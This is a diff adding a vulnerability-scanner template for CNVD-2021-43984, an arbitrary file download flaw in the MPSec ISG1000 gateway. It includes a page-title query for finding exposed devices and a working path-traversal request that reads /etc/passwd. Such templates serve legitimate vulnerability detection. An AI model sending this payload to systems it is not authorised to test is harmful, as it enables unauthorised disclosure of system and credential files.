@@ -1,0 +1,17 @@
+name: MPSec ISG1000 Gateway Filedownload CNVD-2021-43984
+manual: true
+query: title="迈普通信技术股份有限公司"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webui/?g=sys_dia_data_down&file_name=../etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"root")
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-43984
+  description: Founded in 1993, Maipu Communication Technology Co., Ltd. is a leading
+    supplier of network products and solutions in China.
+  tags: filedownload
